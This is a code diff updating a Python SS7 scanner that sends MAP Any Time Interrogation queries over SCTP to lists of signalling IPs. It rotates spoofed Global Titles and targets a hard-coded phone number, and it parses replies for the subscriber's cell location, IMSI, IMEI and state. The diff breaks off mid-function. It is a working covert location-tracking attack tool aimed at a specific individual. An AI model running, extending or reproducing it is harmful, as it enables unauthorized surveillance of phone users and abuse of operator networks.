@@ -2,16 +2,16 @@
 # -*- coding: utf-8 -*-
 
 """
-Enhanced MAP-ATI Scanner v4.0 - Professional Pycrate-Powered Edition
-====================================================================
+Enhanced MAP-ATI Scanner v5.0 - Professional Edition with Fixed Encoding
+=====================================================================
 
-Advanced MAP Any Time Interrogation scanner with full Pycrate integration
-for comprehensive data extraction from MAP protocols.
+Fixed MAP Any Time Interrogation scanner with proper ASN.1 encoding
+and comprehensive error handling with colorful terminal output.
 
 Author: Enhanced Professional Edition for donex1888
 Date: 2025-06-04
-Version: 4.0.0-PROFESSIONAL
-Current Date and Time (UTC): 2025-06-04 01:26:36
+Version: 5.0.0-PROFESSIONAL-FIXED
+Current Date and Time (UTC): 2025-06-04 01:42:22
 Current User's Login: donex1888
 """
 
@@ -45,6 +45,9 @@ class Colors:
     RESET = '\033[0m'
     BOLD = '\033[1m'
     DIM = '\033[2m'
+    ITALIC = '\033[3m'
+    UNDERLINE = '\033[4m'
+    BLINK = '\033[5m'
     
     # Standard colors
     BLACK = '\033[30m'
@@ -57,6 +60,7 @@ class Colors:
     WHITE = '\033[37m'
     
     # Bright colors
+    BRIGHT_BLACK = '\033[90m'
     BRIGHT_RED = '\033[91m'
     BRIGHT_GREEN = '\033[92m'
     BRIGHT_YELLOW = '\033[93m'
@@ -66,30 +70,50 @@ class Colors:
     BRIGHT_WHITE = '\033[97m'
     
     # Background colors
+    BG_BLACK = '\033[40m'
     BG_RED = '\033[41m'
     BG_GREEN = '\033[42m'
     BG_YELLOW = '\033[43m'
     BG_BLUE = '\033[44m'
+    BG_MAGENTA = '\033[45m'
+    BG_CYAN = '\033[46m'
+    BG_WHITE = '\033[47m'
+    
+    # Bright background colors
+    BG_BRIGHT_BLACK = '\033[100m'
+    BG_BRIGHT_RED = '\033[101m'
+    BG_BRIGHT_GREEN = '\033[102m'
+    BG_BRIGHT_YELLOW = '\033[103m'
+    BG_BRIGHT_BLUE = '\033[104m'
+    BG_BRIGHT_MAGENTA = '\033[105m'
+    BG_BRIGHT_CYAN = '\033[106m'
+    BG_BRIGHT_WHITE = '\033[107m'
 
-def print_colored(message: str, color: str = Colors.WHITE, bold: bool = False, bg: str = None):
-    """Print colored message to terminal"""
+def print_colored(message: str, color: str = Colors.WHITE, bold: bool = False, 
+                 bg: str = None, italic: bool = False, underline: bool = False):
+    """Print colored message to terminal with advanced formatting"""
     output = ""
     if bold:
         output += Colors.BOLD
+    if italic:
+        output += Colors.ITALIC
+    if underline:
+        output += Colors.UNDERLINE
     if bg:
         output += bg
     output += color + message + Colors.RESET
     print(output)
 
 def print_professional_banner():
-    """Print professional banner"""
-    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)
-    print_colored("🚀 Enhanced MAP-ATI Scanner v4.0 - Professional Pycrate-Powered Edition", Colors.BRIGHT_GREEN, bold=True)
-    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)
+    """Print enhanced professional banner"""
+    print_colored("="*100, Colors.BRIGHT_CYAN, bold=True)
+    print_colored("🚀 Enhanced MAP-ATI Scanner v5.0 - Professional Edition with Fixed Encoding", Colors.BRIGHT_GREEN, bold=True)
+    print_colored("="*100, Colors.BRIGHT_CYAN, bold=True)
     print_colored(f"📅 Current Date and Time (UTC): {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}", Colors.YELLOW)
     print_colored(f"👤 Current User's Login: donex1888", Colors.YELLOW)
-    print_colored(f"🔧 Professional Edition - Full Pycrate Integration", Colors.CYAN)
-    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)
+    print_colored(f"🔧 Professional Edition - Fixed MAP Parameter Encoding", Colors.CYAN, bold=True)
+    print_colored(f"✅ Enhanced Error Handling & Colorful Terminal Output", Colors.GREEN)
+    print_colored("="*100, Colors.BRIGHT_CYAN, bold=True)
 
 # === Enhanced Data Classes ===
 class AtiVariant(Enum):
@@ -99,6 +123,8 @@ class AtiVariant(Enum):
     EQUIPMENT_STATUS = "EquipmentStatus"
     ALL_INFO = "AllInfo"
     MINIMAL = "Minimal"
+    LOCATION_EPS = "LocationEPS"
+    USER_CSG = "UserCSG"
 
 @dataclass
 class EnhancedLocationInfo:
@@ -121,6 +147,7 @@ class EnhancedLocationInfo:
     msc_name: str = "N/A"
     sgsn_name: str = "N/A"
     gmlc_name: str = "N/A"
+    mme_name: str = "N/A"
     
     # Status flags
     cgi_found: bool = False
@@ -131,6 +158,10 @@ class EnhancedLocationInfo:
     current_location_retrieved: bool = False
     ps_subscriber_state: str = "N/A"
     location_information_age: int = -1
+    
+    # EPS location
+    eps_location_info: str = "N/A"
+    user_csg_info: str = "N/A"
 
 @dataclass
 class EnhancedSubscriberInfo:
@@ -158,13 +189,24 @@ class EnhancedSubscriberInfo:
     # Network capabilities
     supported_features: List[str] = None
     
+    # Additional subscriber data
+    bearer_service_list: List[str] = None
+    teleservice_list: List[str] = None
+    provisioned_ss: List[str] = None
+    
     def __post_init__(self):
         if self.supported_features is None:
             self.supported_features = []
+        if self.bearer_service_list is None:
+            self.bearer_service_list = []
+        if self.teleservice_list is None:
+            self.teleservice_list = []
+        if self.provisioned_ss is None:
+            self.provisioned_ss = []
 
 @dataclass
 class ScanResult:
-    """Professional scan result container"""
+    """Professional scan result container with enhanced details"""
     # Basic info
     ip: str = ""
     port: int = 0
@@ -176,6 +218,7 @@ class ScanResult:
     tcap_outcome: str = "NotStarted"
     error_info: str = "N/A"
     error_code: Optional[int] = None
+    rejection_cause: str = "N/A"
     
     # MAP specific
     map_version: str = "N/A"
@@ -198,6 +241,12 @@ class ScanResult:
     raw_response_hex: str = ""
     parsed_data_size: int = 0
     
+    # Connection details
+    connection_time_ms: float = 0.0
+    response_time_ms: float = 0.0
+    bytes_sent: int = 0
+    bytes_received: int = 0
+    
     def __post_init__(self):
         if self.location_info is None:
             self.location_info = EnhancedLocationInfo()
@@ -207,7 +256,7 @@ class ScanResult:
 # === Professional Dependency Management ===
 def initialize_professional_dependencies():
     """Professional dependency initialization with enhanced error handling"""
-    print_colored("🔧 Initializing professional dependencies...", Colors.YELLOW)
+    print_colored("🔧 Initializing professional dependencies...", Colors.YELLOW, bold=True)
     
     dependencies = {}
     
@@ -232,17 +281,17 @@ def initialize_professional_dependencies():
     return dependencies
 
 def initialize_pycrate_professional():
-    """Professional Pycrate initialization with comprehensive module loading"""
-    print_colored("🔧 Initializing Pycrate Professional Edition...", Colors.YELLOW)
+    """Professional Pycrate initialization with comprehensive module loading and proper ASN.1 handling"""
+    print_colored("🔧 Initializing Pycrate Professional Edition with Fixed Encoding...", Colors.YELLOW, bold=True)
     
     try:
         # Core ASN.1 Runtime
         from pycrate_asn1rt.err import ASN1Err, ASN1ObjErr
-        from pycrate_asn1rt.asnobj_basic import OID, INT, NULL, ASN1Obj
-        from pycrate_asn1rt.asnobj_str import OCT_STR
-        from pycrate_asn1rt.asnobj_construct import SEQ, CHOICE, SEQ_OF
+        from pycrate_asn1rt.asnobj_basic import OID, INT, NULL, ASN1Obj, BOOL
+        from pycrate_asn1rt.asnobj_str import OCT_STR, BIT_STR
+        from pycrate_asn1rt.asnobj_construct import SEQ, CHOICE, SEQ_OF, SET
         from pycrate_asn1rt.codecs import ASN1CodecBER
-        print_colored("✅ Pycrate ASN.1 runtime loaded", Colors.GREEN)
+        print_colored("✅ Pycrate ASN.1 runtime loaded with proper NULL support", Colors.GREEN)
         
         # Mobile protocol modules
         from pycrate_mobile import SCCP
@@ -311,7 +360,7 @@ def initialize_pycrate_professional():
             print_colored("❌ Failed to load TCAP definitions", Colors.RED, bold=True)
             sys.exit(1)
         
-        print_colored("✅ All Pycrate components initialized successfully", Colors.BRIGHT_GREEN, bold=True)
+        print_colored("✅ All Pycrate components initialized successfully with proper ASN.1 support", Colors.BRIGHT_GREEN, bold=True)
         
         return {
             'SCCP': SCCP,
@@ -321,13 +370,18 @@ def initialize_pycrate_professional():
             'ASN1ObjErr': ASN1ObjErr,
             'ASN1CodecBER': ASN1CodecBER,
             'OCT_STR': OCT_STR,
+            'BIT_STR': BIT_STR,
             'SEQ': SEQ,
             'CHOICE': CHOICE,
-            'INT': INT
+            'SET': SET,
+            'INT': INT,
+            'NULL': NULL,
+            'BOOL': BOOL
         }
         
     except Exception as e:
         print_colored(f"❌ Pycrate initialization error: {e}", Colors.RED, bold=True)
+        traceback.print_exc()
         sys.exit(1)
 
 # Initialize professional dependencies
@@ -337,29 +391,31 @@ PYCRATE = initialize_pycrate_professional()
 # === Professional Constants ===
 MAP_OP_ANY_TIME_INTERROGATION = 71
 
-# Enhanced Configuration
+# Enhanced Configuration with more options
 PROFESSIONAL_CONFIG = {
     'target_msisdn': "212681364829",
     'ips_file': "ips.txt",
-    'results_dir': "professional_results_v4",
+    'results_dir': "professional_results_v5",
     'max_workers': 30,
-    'sctp_timeout': 12,
+    'sctp_timeout': 15,
     'sctp_ppid': 0,
-    'sctp_ports': [2905, 2906, 2907, 2908],
-    'retry_attempts': 2,
-    'retry_delay': 2.0,
-    'gt_pool_size': 500,
-    'chunk_size': 10000
+    'sctp_ports': [2905, 2906, 2907, 2908, 2909, 2910],
+    'retry_attempts': 3,
+    'retry_delay': 2.5,
+    'gt_pool_size': 1000,
+    'chunk_size': 10000,
+    'connection_timeout': 8,
+    'response_timeout': 12
 }
 
-# Professional SCCP Configuration
+# Professional SCCP Configuration with more SSNs
 SCCP_PROFESSIONAL = {
     'cdpa_ssn': 149,
     'cdpa_tt': 0,
     'cdpa_np': 1,
     'cdpa_nai': 4,
     'cdpa_es': 1,
-    'cgpa_ssn_pool': [6, 7, 8, 9, 146, 147, 148, 149, 150, 151, 152, 153],
+    'cgpa_ssn_pool': [6, 7, 8, 9, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156],
     'cgpa_gt_digits': "212600000000",
     'cgpa_tt': 0,
     'cgpa_np': 1,
@@ -381,38 +437,70 @@ TCAP_TAGS = {
     'COMP_RETURN_RESULT_LAST': 0xA2,
     'COMP_RETURN_ERROR': 0xA3,
     'COMP_REJECT': 0xA4,
-    'DIALOGUE_PORTION': 0x6B
+    'DIALOGUE_PORTION': 0x6B,
+    'USER_INFORMATION': 0x28,
+    'DIALOGUE_REQUEST': 0x60,
+    'DIALOGUE_RESPONSE': 0x61,
+    'DIALOGUE_ABORT': 0x64
 }
 
-# Comprehensive MAP Error Codes
+# Comprehensive MAP Error Codes with detailed descriptions
 MAP_ERRORS = {
-    1: "Unknown Subscriber",
-    3: "Unknown MSC",
-    5: "Unidentified Subscriber",
-    6: "Absent Subscriber SM",
-    8: "Unknown Equipment",
-    9: "Roaming Not Allowed",
-    10: "Illegal Subscriber",
-    11: "Bearer Service Not Provisioned",
-    12: "Teleservice Not Provisioned",
-    13: "Illegal Equipment",
-    21: "Facility Not Supported",
-    27: "Absent Subscriber",
-    28: "Incompatible Terminal",
-    29: "Not Reachable",
-    34: "System Failure",
-    35: "Data Missing",
-    36: "Unexpected Data Value",
-    37: "Facility Not Supported",
-    44: "Number Changed",
-    45: "Busy Subscriber",
-    49: "ATI Not Allowed",
-    50: "ATSI Not Allowed",
-    51: "ATM Not Allowed",
-    52: "Information Not Available"
+    1: "Unknown Subscriber - IMSI not recognized",
+    3: "Unknown MSC - MSC not in network",
+    5: "Unidentified Subscriber - Subscriber identity issue",
+    6: "Absent Subscriber SM - Subscriber not reachable for SMS",
+    8: "Unknown Equipment - IMEI not recognized",
+    9: "Roaming Not Allowed - Roaming restrictions active",
+    10: "Illegal Subscriber - Subscriber barred from service",
+    11: "Bearer Service Not Provisioned - Service not available",
+    12: "Teleservice Not Provisioned - Teleservice not subscribed",
+    13: "Illegal Equipment - IMEI blacklisted",
+    21: "Facility Not Supported - Feature not implemented",
+    27: "Absent Subscriber - Subscriber not reachable",
+    28: "Incompatible Terminal - Terminal incompatibility",
+    29: "Not Reachable - Subscriber unreachable",
+    34: "System Failure - Network system error",
+    35: "Data Missing - Required data not available",
+    36: "Unexpected Data Value - Invalid parameter value",
+    37: "Facility Not Supported - Operation not supported",
+    44: "Number Changed - MSISDN has been changed",
+    45: "Busy Subscriber - Subscriber busy",
+    49: "ATI Not Allowed - ATI operation not permitted",
+    50: "ATSI Not Allowed - ATSI operation not permitted",
+    51: "ATM Not Allowed - ATM operation not permitted",
+    52: "Information Not Available - Requested info unavailable",
+    53: "Unauthorized Requesting Network - Network not authorized",
+    54: "Unauthorized LCS Client - LCS client not authorized",
+    55: "Position Method Failure - Positioning failed",
+    58: "Unknown Or Unreachable LCS Client - LCS client issue",
+    59: "MM Event Not Supported - Mobility management event error"
 }
 
-# Professional Statistics
+# Enhanced TCAP Reject Causes
+TCAP_REJECT_CAUSES = {
+    0: "General Problem - Unrecognized Component",
+    1: "General Problem - Mistyped Component",
+    2: "General Problem - Badly Structured Component",
+    16: "Invoke Problem - Duplicate Invoke ID",
+    17: "Invoke Problem - Unrecognized Operation",
+    18: "Invoke Problem - Mistyped Parameter",
+    19: "Invoke Problem - Resource Limitation",
+    20: "Invoke Problem - Initiating Release",
+    21: "Invoke Problem - Unrecognized Linked ID",
+    22: "Invoke Problem - Linked Response Unexpected",
+    23: "Invoke Problem - Unexpected Linked Operation",
+    32: "Return Result Problem - Unrecognized Invoke ID",
+    33: "Return Result Problem - Return Result Unexpected",
+    34: "Return Result Problem - Mistyped Parameter",
+    48: "Return Error Problem - Unrecognized Invoke ID",
+    49: "Return Error Problem - Return Error Unexpected",
+    50: "Return Error Problem - Unrecognized Error",
+    51: "Return Error Problem - Unexpected Error",
+    52: "Return Error Problem - Mistyped Parameter"
+}
+
+# Professional Statistics with more metrics
 PROFESSIONAL_STATS = {
     'total_attempts': 0,
     'successful_responses': 0,
@@ -427,22 +515,28 @@ PROFESSIONAL_STATS = {
     'parse_errors': 0,
     'map_errors': 0,
     'tcap_rejects': 0,
+    'tcap_aborts': 0,
+    'parameter_errors': 0,
     'start_time': None,
     'error_breakdown': defaultdict(int),
     'success_rate': 0.0,
-    'data_richness_score': 0.0
+    'data_richness_score': 0.0,
+    'average_response_time': 0.0,
+    'fastest_response': float('inf'),
+    'slowest_response': 0.0
 }
 
 # Threading locks
 main_csv_lock = threading.Lock()
 stats_lock = threading.Lock()
+terminal_lock = threading.Lock()
 logger = None
 
 # === Professional GT Pool Management ===
 class ProfessionalGTPool:
     """Professional Global Title Pool with intelligent distribution"""
     
-    def __init__(self, base_gt: str, pool_size: int = 500):
+    def __init__(self, base_gt: str, pool_size: int = 1000):
         self.base_gt = base_gt
         self.pool_size = pool_size
         self.gt_pool = []
@@ -480,11 +574,6 @@ class ProfessionalGTPool:
             self.usage_stats[gt] += 1
             self.current_index = (self.current_index + 1) % self.pool_size
             return gt
-    
-    def get_usage_stats(self) -> Dict[str, int]:
-        """Get GT usage statistics"""
-        with self.lock:
-            return dict(self.usage_stats)
 
 # Initialize Professional GT Pool
 gt_pool = None
@@ -493,7 +582,7 @@ gt_pool = None
 
 def setup_professional_logging(log_file: Path, log_level: str = "INFO") -> logging.Logger:
     """Setup professional logging with enhanced formatting"""
-    logger = logging.getLogger("professional_map_scanner_v4")
+    logger = logging.getLogger("professional_map_scanner_v5")
     logger.handlers.clear()
     logger.setLevel(logging.DEBUG)
     
@@ -568,6 +657,42 @@ def decode_tbcd_string(tbcd_bytes: bytes) -> str:
             digits.append(str(digit2))
     
     return ''.join(digits) if digits else "N/A"
+
+def print_connection_status(ip: str, port: int, status: str, details: str = "", 
+                          color: str = Colors.WHITE, unique_id: str = ""):
+    """Print colorful connection status with thread safety"""
+    with terminal_lock:
+        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+        
+        # Status icons and colors
+        status_icons = {
+            "CONNECTING": ("🔄", Colors.BLUE),
+            "CONNECTED": ("✅", Colors.GREEN),
+            "SENDING": ("📤", Colors.CYAN),
+            "RECEIVING": ("📥", Colors.MAGENTA),
+            "SUCCESS": ("🎯", Colors.BRIGHT_GREEN),
+            "PARTIAL_SUCCESS": ("⚡", Colors.YELLOW),
+            "ERROR": ("❌", Colors.RED),
+            "TIMEOUT": ("⏰", Colors.YELLOW),
+            "REJECTED": ("🚫", Colors.RED),
+            "FAILED": ("💥", Colors.BRIGHT_RED),
+            "BUILDING": ("🔨", Colors.CYAN),
+            "PARSING": ("🔍", Colors.BLUE)
+        }
+        
+        icon, status_color = status_icons.get(status, ("ℹ️", color))
+        
+        # Format the output
+        output_parts = [
+            f"{timestamp}",
+            f"[{unique_id}]" if unique_id else "",
+            f"{icon} {ip}:{port}",
+            f"- {status}",
+            f"- {details}" if details else ""
+        ]
+        
+        output_line = " ".join(filter(None, output_parts))
+        print_colored(output_line, status_color, bold=(status in ["SUCCESS", "FAILED", "ERROR"]))
 
 # === Professional Response Parser ===
 
@@ -681,7 +806,7 @@ def decode_ati_response_professional(response_data: bytes, unique_id: str) -> Op
         return None
 
 def parse_location_information_professional(location_data: Any, unique_id: str) -> EnhancedLocationInfo:
-    """Professional location information parser"""
+    """Professional location information parser with enhanced extraction"""
     
     location = EnhancedLocationInfo()
     
@@ -743,6 +868,12 @@ def parse_location_information_professional(location_data: Any, unique_id: str) 
                 if isinstance(sgsn_data, bytes):
                     location.sgsn_name = decode_tbcd_string(sgsn_data[1:])
             
+            # Parse MME name
+            if 'mme-name' in location_data:
+                mme_data = location_data['mme-name']
+                if isinstance(mme_data, bytes):
+                    location.mme_name = decode_tbcd_string(mme_data[1:])
+            
             # Set success flags
             if location.mcc != "N/A" and location.mnc != "N/A":
                 if location.cell_id != "N/A":
@@ -757,7 +888,7 @@ def parse_location_information_professional(location_data: Any, unique_id: str) 
     return location
 
 def parse_subscriber_info_professional(subscriber_data: Any, unique_id: str) -> EnhancedSubscriberInfo:
-    """Professional subscriber information parser"""
+    """Professional subscriber information parser with enhanced extraction"""
     
     subscriber = EnhancedSubscriberInfo()
     
@@ -805,6 +936,18 @@ def parse_subscriber_info_professional(subscriber_data: Any, unique_id: str) -> 
             if 'roamingRestrictionDueToUnsupportedFeature' in subscriber_data:
                 subscriber.roaming_restriction = "true"
             
+            # Parse bearer service list
+            if 'bearerServiceList' in subscriber_data:
+                bs_list = subscriber_data['bearerServiceList']
+                if isinstance(bs_list, list):
+                    subscriber.bearer_service_list = [str(bs) for bs in bs_list]
+            
+            # Parse teleservice list
+            if 'teleserviceList' in subscriber_data:
+                ts_list = subscriber_data['teleserviceList']
+                if isinstance(ts_list, list):
+                    subscriber.teleservice_list = [str(ts) for ts in ts_list]
+            
             if logger:
                 logger.info(f"[{unique_id}] 📱 Professional subscriber info: IMSI={subscriber.imsi}, State={subscriber.subscriber_state}")
     
@@ -831,7 +974,7 @@ def parse_extension_container_professional(extension_data: Any, result: ScanResu
             logger.debug(f"[{unique_id}] Extension container parsing error: {e}")
 
 def parse_response_professional(raw_response: bytes, unique_id: str) -> ScanResult:
-    """Professional response parser with full Pycrate integration"""
+    """Professional response parser with full Pycrate integration and enhanced error handling"""
     
     result = ScanResult()
     result.tcap_outcome = 'ParseError'
@@ -839,15 +982,20 @@ def parse_response_professional(raw_response: bytes, unique_id: str) -> ScanResu
     
     if not raw_response or len(raw_response) < 5:
         result.error_info = f"Response too short: {len(raw_response)} bytes"
+        result.rejection_cause = "Invalid response length"
         return result
     
     result.raw_response_hex = raw_response.hex()
+    result.bytes_received = len(raw_response)
     
     try:
+        print_connection_status("", 0, "PARSING", f"Parsing {len(raw_response)} bytes", unique_id=unique_id)
+        
         # Extract TCAP payload
         tcap_payload = extract_tcap_from_sccp_professional(raw_response)
         if not tcap_payload:
             result.error_info = "Failed to extract TCAP payload"
+            result.rejection_cause = "SCCP parsing failed"
             return result
         
         if logger:
@@ -871,9 +1019,15 @@ def parse_response_professional(raw_response: bytes, unique_id: str) -> ScanResu
                 elif msg_type == 'abort':
                     result.tcap_outcome = 'Abort'
                     result.error_info = "TCAP Abort received"
+                    result.rejection_cause = "TCAP Abort"
+                    # Try to extract abort reason
+                    if isinstance(msg_content, dict) and 'reason' in msg_content:
+                        abort_reason = msg_content['reason']
+                        result.rejection_cause = f"TCAP Abort: {abort_reason}"
                 else:
                     result.tcap_outcome = f"Unknown_TCAP({msg_type})"
                     result.error_info = f"Unknown TCAP message type: {msg_type}"
+                    result.rejection_cause = f"Unknown TCAP type: {msg_type}"
             
         except Exception as tcap_error:
             if logger:
@@ -886,11 +1040,12 @@ def parse_response_professional(raw_response: bytes, unique_id: str) -> ScanResu
         if logger:
             logger.error(f"[{unique_id}] Professional response parsing exception: {e}")
         result.error_info = f"Parsing exception: {str(e)[:100]}"
+        result.rejection_cause = f"Parser error: {type(e).__name__}"
     
     return result
 
 def process_tcap_response_professional(msg_content: Any, unique_id: str, result: ScanResult) -> ScanResult:
-    """Professional TCAP response processor"""
+    """Professional TCAP response processor with enhanced error detection"""
     
     try:
         if isinstance(msg_content, dict):
@@ -929,10 +1084,22 @@ def process_tcap_response_professional(msg_content: Any, unique_id: str, result:
                                 error_code = comp_data['errorCode']
                                 result.error_code = error_code
                                 result.error_info = MAP_ERRORS.get(error_code, f"MAP Error {error_code}")
+                                result.rejection_cause = f"MAP Error {error_code}"
                         
                         elif comp_type == 'reject':
                             result.tcap_outcome = 'Reject'
                             result.error_info = "TCAP Reject received"
+                            result.rejection_cause = "TCAP Reject"
+                            
+                            # Try to extract reject reason
+                            if isinstance(comp_data, dict):
+                                if 'problem' in comp_data:
+                                    problem = comp_data['problem']
+                                    if isinstance(problem, tuple) and len(problem) >= 2:
+                                        problem_type, problem_code = problem[0], problem[1]
+                                        reject_desc = TCAP_REJECT_CAUSES.get(problem_code, f"Unknown reject {problem_code}")
+                                        result.rejection_cause = f"TCAP Reject: {problem_type} - {reject_desc}"
+                                        result.error_info = result.rejection_cause
     
     except Exception as e:
         if logger:
@@ -941,10 +1108,11 @@ def process_tcap_response_professional(msg_content: Any, unique_id: str, result:
     return result
 
 def parse_components_manually_professional(tcap_payload: bytes, unique_id: str, result: ScanResult) -> ScanResult:
-    """Professional manual component parser as fallback"""
+    """Professional manual component parser with enhanced fallback parsing"""
     
     if len(tcap_payload) < 2:
         result.error_info = "TCAP payload too short for manual parsing"
+        result.rejection_cause = "Invalid TCAP length"
         return result
     
     tcap_type = tcap_payload[0]
@@ -970,11 +1138,31 @@ def parse_components_manually_professional(tcap_payload: bytes, unique_id: str, 
     elif tcap_type == TCAP_TAGS['MSG_ABORT']:
         result.tcap_outcome = 'Abort'
         result.error_info = "TCAP Abort received"
+        result.rejection_cause = "TCAP Abort"
+        
+        # Try to extract abort cause
+        if len(tcap_payload) > 5:
+            try:
+                # Look for abort cause in the payload
+                for i in range(2, min(len(tcap_payload) - 2, 10)):
+                    if tcap_payload[i] == 0x0A:  # P-Abort-cause
+                        abort_cause = tcap_payload[i + 2] if i + 2 < len(tcap_payload) else 0
+                        abort_reasons = {
+                            0: "Unrecognized message type",
+                            1: "Unrecognized transaction ID",
+                            2: "Badly formatted transaction portion",
+                            3: "Incorrect transaction portion",
+                            4: "Resource limitation"
+                        }
+                        result.rejection_cause = f"P-Abort: {abort_reasons.get(abort_cause, f'Unknown cause {abort_cause}')}"
+                        break
+            except:
+                pass
     
     return result
 
 def parse_components_data_professional(comp_data: bytes, unique_id: str, result: ScanResult) -> ScanResult:
-    """Professional component data parser"""
+    """Professional component data parser with enhanced error detection"""
     
     offset = 0
     
@@ -1030,7 +1218,7 @@ def parse_components_data_professional(comp_data: bytes, unique_id: str, result:
                 
             elif comp_tag == TCAP_TAGS['COMP_RETURN_ERROR']:
                 result.tcap_outcome = 'ReturnError'
-                # Extract error code
+                # Extract error code with enhanced detection
                 try:
                     for i in range(offset, min(offset + 20, len(comp_data) - 1)):
                         if comp_data[i] == 0x02 and i + 2 < len(comp_data):
@@ -1038,14 +1226,30 @@ def parse_components_data_professional(comp_data: bytes, unique_id: str, result:
                             if error_code in MAP_ERRORS:
                                 result.error_info = MAP_ERRORS[error_code]
                                 result.error_code = error_code
+                                result.rejection_cause = f"MAP Error {error_code}: {MAP_ERRORS[error_code]}"
                                 break
                 except Exception:
                     result.error_info = "MAP Error detected"
+                    result.rejection_cause = "Unknown MAP Error"
                 break
                 
             elif comp_tag == TCAP_TAGS['COMP_REJECT']:
                 result.tcap_outcome = 'Reject'
                 result.error_info = "TCAP Reject detected"
+                result.rejection_cause = "TCAP Component Reject"
+                
+                # Try to extract reject problem
+                try:
+                    for i in range(offset + 2, min(offset + 15, len(comp_data) - 1)):
+                        if comp_data[i] in [0x80, 0x81, 0x82, 0x83]:  # Problem tags
+                            if i + 1 < len(comp_data):
+                                problem_code = comp_data[i + 1]
+                                reject_desc = TCAP_REJECT_CAUSES.get(problem_code, f"Unknown problem {problem_code}")
+                                result.rejection_cause = f"TCAP Reject: {reject_desc}"
+                                result.error_info = result.rejection_cause
+                                break
+                except Exception:
+                    pass
                 break
             
             offset += 1
@@ -1058,7 +1262,7 @@ def parse_components_data_professional(comp_data: bytes, unique_id: str, result:
     return result
 
 def find_cgi_patterns_professional(data: bytes, unique_id: str) -> Optional[EnhancedLocationInfo]:
-    """Professional CGI pattern finder with enhanced validation"""
+    """Professional CGI pattern finder with enhanced validation and multiple pattern detection"""
     
     for i in range(len(data) - 6):
         try:
@@ -1073,7 +1277,7 @@ def find_cgi_patterns_professional(data: bytes, unique_id: str) -> Optional[Enha
                     break
             
             if valid_plmn:
-                # Try CGI
+                # Try CGI (7 bytes)
                 if i + 7 <= len(data):
                     test_cgi = data[i:i+7]
                     try:
@@ -1096,7 +1300,7 @@ def find_cgi_patterns_professional(data: bytes, unique_id: str) -> Optional[Enha
                     except Exception:
                         continue
                 
-                # Try LAI
+                # Try LAI (5 bytes)
                 elif i + 5 <= len(data):
                     test_lai = data[i:i+5]
                     try:
@@ -1124,905 +1328,42 @@ def find_cgi_patterns_professional(data: bytes, unique_id: str) -> Optional[Enha
 # === Professional Display Functions ===
 
 def display_professional_result(result: ScanResult, unique_id: str):
-    """Display scan result with professional formatting"""
+    """Display scan result with enhanced professional formatting and colors"""
     
     # Determine status and colors
     if result.location_info.cgi_found and result.subscriber_info.imsi != "N/A":
         title_color = Colors.BRIGHT_GREEN
         status_emoji = "🎯"
-        status_text = "FULL SUCCESS - COMPLETE DATA"
+        status_text = "FULL SUCCESS - COMPLETE DATA EXTRACTION"
+        status_bg = Colors.BG_GREEN
     elif result.location_info.cgi_found:
         title_color = Colors.GREEN
         status_emoji = "📍"
         status_text = "LOCATION SUCCESS - CGI EXTRACTED"
+        status_bg = Colors.BG_BLUE
     elif result.subscriber_info.imsi != "N/A":
         title_color = Colors.CYAN
         status_emoji = "📱"
         status_text = "SUBSCRIBER SUCCESS - IMSI EXTRACTED"
+        status_bg = Colors.BG_CYAN
     elif result.success:
         title_color = Colors.BLUE
         status_emoji = "✅"
         status_text = "PARTIAL SUCCESS"
+        status_bg = None
     elif 'Timeout' in result.tcap_outcome:
         title_color = Colors.YELLOW
         status_emoji = "⏰"
         status_text = "TIMEOUT"
+        status_bg = Colors.BG_YELLOW
     elif 'Error' in result.tcap_outcome:
         title_color = Colors.BRIGHT_RED
         status_emoji = "❌"
         status_text = "MAP ERROR"
+        status_bg = Colors.BG_RED
     elif 'Reject' in result.tcap_outcome:
         title_color = Colors.RED
         status_emoji = "🚫"
-        status_text = "REJECTED"
-    else:
-        title_color = Colors.MAGENTA
-        status_emoji = "❓"
-        status_text = "UNKNOWN"
-    
-    # Display header
-    print_colored("─" * 90, Colors.CYAN)
-    print_colored(f"{status_emoji} {result.ip}:{result.port} - {status_text}", title_color, bold=True)
-    print_colored(f"⏱️  Duration: {result.duration_ms:.2f}ms | TCAP: {result.tcap_outcome} | Size: {result.parsed_data_size}B", Colors.WHITE)
-    
-    # Location Information
-    if result.location_info.cgi_found:
-        print_colored(f"📍 CGI: MCC={result.location_info.mcc}, MNC={result.location_info.mnc}, "
-                     f"LAC={result.location_info.lac}, CI={result.location_info.cell_id}", 
-                     Colors.BRIGHT_GREEN, bold=True)
-    elif result.location_info.lai_found:
-        print_colored(f"📍 LAI: MCC={result.location_info.mcc}, MNC={result.location_info.mnc}, "
-                     f"LAC={result.location_info.lac}", Colors.GREEN)
-    
-    # Subscriber Information
-    if result.subscriber_info.imsi != "N/A":
-        print_colored(f"📱 IMSI: {result.subscriber_info.imsi}", Colors.BRIGHT_CYAN, bold=True)
-    
-    if result.subscriber_info.msisdn != "N/A":
-        print_colored(f"📞 MSISDN: {result.subscriber_info.msisdn}", Colors.CYAN)
-    
-    if result.subscriber_info.imei != "N/A":
-        print_colored(f"📟 IMEI: {result.subscriber_info.imei}", Colors.CYAN)
-    
-    # Network Information
-    if result.location_info.vlr_name != "N/A":
-        print_colored(f"🏢 VLR: {result.location_info.vlr_name}", Colors.BLUE)
-    
-    if result.location_info.msc_name != "N/A":
-        print_colored(f"🏢 MSC: {result.location_info.msc_name}", Colors.BLUE)
-    
-    if result.location_info.sgsn_name != "N/A":
-        print_colored(f"🏢 SGSN: {result.location_info.sgsn_name}", Colors.BLUE)
-    
-    # Subscriber State
-    if result.subscriber_info.subscriber_state != "N/A":
-        print_colored(f"📊 Subscriber State: {result.subscriber_info.subscriber_state}", Colors.YELLOW)
-    
-    # Advanced Information
-    if result.location_info.location_age != "N/A":
-        print_colored(f"⏰ Location Age: {result.location_info.location_age}", Colors.DIM)
-    
-    if result.location_info.geographical_info != "N/A":
-        print_colored(f"🌍 Geo Info: {result.location_info.geographical_info[:20]}...", Colors.DIM)
-    
-    # Error Information
-    if result.error_info != "N/A" and "successfully" not in result.error_info:
-        error_color = Colors.RED if "Error" in result.tcap_outcome else Colors.YELLOW
-        print_colored(f"ℹ️  Info: {result.error_info}", error_color)
-    
-    if result.error_code is not None and result.error_code != -1:
